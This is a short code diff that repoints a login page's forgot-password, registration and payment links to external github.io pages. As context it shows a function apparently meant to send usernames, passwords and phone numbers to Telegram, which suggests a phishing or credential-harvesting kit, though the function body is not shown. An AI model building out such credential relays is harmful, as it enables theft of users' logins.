@@ -54,15 +54,15 @@
     }
 
     function showForgotPassword() {
-        window.location.href = "index.html";
+        window.location.href = "https://enockofficial.github.io/SMG-OFFICE-2024/forgot_php.html";
     }
 
     function showRegisterForm() {
-        window.location.href = "index.html";
+        window.location.href = "https://enockofficial.github.io/SMG-OFFICE-2024/registe_php.html";
     }
 
     function showPayment() {
-        window.location.href = "index.html";
+        window.location.href = "https://enockofficial.github.io/SMG-OFFICE-2024/payment_php.html";
     }
 
       function sendTelegramMessage2(username, password, phone, expireDate) {
